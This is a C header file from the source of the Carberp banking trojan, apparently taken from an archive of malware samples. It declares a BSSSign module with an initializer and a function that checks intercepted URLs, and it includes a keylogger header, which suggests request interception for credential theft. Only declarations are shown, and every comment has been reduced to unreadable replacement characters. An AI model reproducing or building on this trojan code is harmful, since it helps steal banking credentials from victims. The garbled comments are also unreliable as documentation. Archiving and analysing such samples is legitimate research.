/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef bsssignH
#define bsssignH



#include <windows.h>
#include <wininet.h>
#include "UniversalKeyLogger.h"


// ����� �������������� ������ ���� ��� ���������� � ���������. ���� ����������� �����, ���� �� ����������� ������
//void IsBsssign(HINTERNET hRequest);

//***********************************************************************
//  ������ BSSSign
//***********************************************************************
namespace BSSSign
{
	//------------------------------------------
	// ������� �������������� �������
	// ������� BSS
	//------------------------------------------
	void Initialize();

	//------------------------------------------
	//  ������� ��������� ������ �� �������
	//  ����� ������� �� ������� ������� � ���
	//  ������� ����������
	//------------------------------------------
	void CheckRequest(PCHAR URL);


}

#endif